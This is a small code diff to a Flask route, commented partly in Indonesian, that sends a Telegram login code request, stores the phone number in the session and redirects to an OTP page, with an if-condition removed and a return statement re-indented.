@@ -135,12 +135,13 @@ def index():
                 client = await init_client(phone_number, session_file)
                 if not await client.is_user_authorized():
                     await client.send_code_request(phone_number)
-                return True
+                    return True
+                return True  # Jika sudah authorized, tetap return True
 
-            if run_async(send_code()):
-                # Store phone number in Flask session
-                session['current_phone'] = phone_number
-                logging.debug(f"Phone number stored in session: {session['current_phone']}")
+            run_async(send_code())  # Hapus if condition di sini
+            # Store phone number in Flask session
+            session['current_phone'] = phone_number
+            logging.debug(f"Phone number stored in session: {session['current_phone']}")
                 
             logging.debug(f"Current clients in dictionary: {list(clients.keys())}")
             return redirect(url_for("otp", phone_number=phone_number))
